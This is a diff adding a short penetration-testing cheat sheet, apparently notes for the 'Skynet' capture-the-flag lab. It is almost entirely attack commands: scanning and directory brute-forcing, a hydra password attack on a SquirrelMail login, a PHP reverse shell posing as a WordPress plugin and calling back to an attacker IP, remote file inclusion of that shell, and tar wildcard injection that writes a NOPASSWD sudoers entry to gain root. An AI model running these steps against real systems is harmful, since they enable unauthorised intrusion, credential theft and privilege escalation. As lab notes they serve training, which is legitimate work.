@@ -1,0 +1,42 @@
+namp -sV -sT <target IP>
+dirbuster dir -u http://10.10.194.235 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+smbmap -H <target IP>
+
+hydra -l milesdyson -P "/home/kali/Desktop/Offisive Pentest/Skynet/log1.txt"  10.10.92.247 -V http-form-post '/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown User or password incorrect.'
+
+searchsploit <target name or version>
+
+
+Reverse Shell
+<?php
+/**
+ * Plugin Name: Wordpress Reverse Shell
+ * Author: azkrath
+ */
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.2.0.117/4444 0>&1'")
+?>
+
+
+Run Web Server with Python
+sudo Python3 -m http.server 80
+
+Download shell file
+http://skynet/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.109.169/rshell.php
+
+
+
+Privilege Escalation
+
+to upgrade it to a interactive tty shell, using the following Python command:
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+checking Crontab
+cat /etc/crontab  (running backup.sh)
+
+To take advantage ,  create a script to add our user to sudoers and gain root while on the machine:
+
+echo 'echo "www-data ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh    (write under /var/www.html)
+touch "/var/www/html/--checkpoint-action=exec=sh sudo.sh"
+touch "/var/www/html/--checkpoint=1"
+
+ 
